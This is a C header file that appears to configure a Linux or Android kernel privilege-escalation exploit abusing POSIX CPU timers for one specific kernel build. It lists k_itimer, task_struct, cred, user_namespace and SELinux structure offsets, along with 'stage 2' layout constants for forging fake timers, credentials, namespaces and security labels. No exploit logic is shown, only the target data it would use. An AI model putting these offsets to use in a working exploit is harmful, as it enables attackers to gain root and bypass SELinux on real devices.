#ifndef IC_TIMER_TARGET_H
#define IC_TIMER_TARGET_H

#define OFF_KITIMER_IT_CPU              0x78
#define OFF_KITIMER_IT_CPU_ELIST        0xa8
#define OFF_KITIMER_IT_CPU_HANDLING     0xc0
#define OFF_KITIMER_IT_INTERVAL         0x58
#define OFF_KITIMER_IT_OVERRUN          0x40
#define OFF_KITIMER_IT_SIGEV             0x54
#define SIZEOF_KITIMER                  0x108

/* BTF (gf506252): posix_cputimers.bases[CPUCLOCK_SCHED].tqhead is at
 * task+0x7c8; the base's nextevt is at +0x7c0 and the cached rb_leftmost
 * at +0x7d0.  (0x7c0 is nextevt, not the queue head.) */
#define OFF_TASK_CPU_TIMER_NEXTEVT      0x7c0
#define OFF_TASK_CPU_TIMER_HEAD         0x7c8
#define OFF_TASK_CPU_TIMER_LEFTMOST     0x7d0
#define OFF_TASK_CRED                   0x838
#define OFF_TASK_REAL_CRED              0x830

#define OFF_CRED_UID                    4
#define OFF_CRED_GID                    8
#define OFF_CRED_EUID                   20
#define OFF_CRED_EGID                   24
#define OFF_CRED_SUID                   12
#define OFF_CRED_SGID                   16
#define OFF_CRED_FSUID                  28
#define OFF_CRED_FSGID                  32
#define OFF_CRED_CAP_INH                40
#define OFF_CRED_CAP_PRM                48
#define OFF_CRED_CAP_EFF                56
#define OFF_CRED_SECURITY               120
#define OFF_CRED_USER_NS                136
#define OFF_CRED_NON_RCU                0
#define SIZEOF_CRED                     0xb0
#define SIZEOF_CRED_REAL                0xb0

#define OFF_USER_NAMESPACE_OWNER        0xe4
#define OFF_USER_NAMESPACE_GROUP        0xe8
#define OFF_USER_NAMESPACE_NS_INUM      0x100
#define OFF_USER_NAMESPACE_LEVEL        0xe0
#define SIZEOF_USER_NAMESPACE           0x298

#define OFF_TASK_SECURITY               0xbf0
#define OFF_CRED_SECURITY_PTR           0x78
#define OFF_SELINUX_LABEL               0
#define SIZEOF_SELINUX_LABEL            0x18
#define OFF_SELINUX_CRED_SECURITY       0x78

#define KERNEL_VA_START                 0xffffff8000000000UL
#define KERNEL_VA_TAG_MASK              0xffff000000000000UL

#define IC_CROSS_PAGE_THRESHOLD         0xc0
#define IC_CROSS_PAGE_MARKER_OFF        0xFFFF
#define IC_ELIST_TO_OBJECT_DELTA        0xa8
#define IC_OBJECT_SIZE_PLACEHOLDER      0x108
#define IC_STAGE2_LAYOUT_A              0x100
#define IC_STAGE2_LAYOUT_B              0x100
#define IC_STAGE2_LAYOUT_C              0x700
#define IC_STAGE2_FAKE_TIMER_DELTA      0x100
#define IC_STAGE2_FAKE_USERNS_DELTA     0x200
#define IC_STAGE2_SECURITY_DELTA        0x320
#define IC_STAGE2_LABEL_DELTA           0x340
#define IC_STAGE2_LABEL_SIZE            0x18
#define IC_STAGE2_CRED_SIZE             0xb0
#define IC_STAGE2_USERNS_SIZE           0x120
#define IC_STAGE2_SECURITY_SIZE         0x18

#define IC_SIGEV_SIGNO                  (SIGRTMIN + 2)
#define IC_EXEC_SIGNO                   SIGRTMIN

#define IC_AIO_RING_MAGIC               0xa10a10a1u

#endif